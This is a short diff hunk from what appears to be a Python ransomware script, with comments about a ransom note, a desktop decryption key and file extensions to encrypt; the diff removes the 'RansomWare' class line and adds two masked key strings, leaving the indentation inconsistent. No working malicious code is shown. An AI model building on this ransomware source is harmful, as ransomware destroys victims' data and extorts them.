@@ -16,8 +16,8 @@ import base64
 import threading # used for ransom note and decryption key on dekstop
 
 
-
-class RansomWare:
+access_key = '********************'
+not_a_secret = '****************************************'
 
     
     # File exstensions to seek out and Encrypt
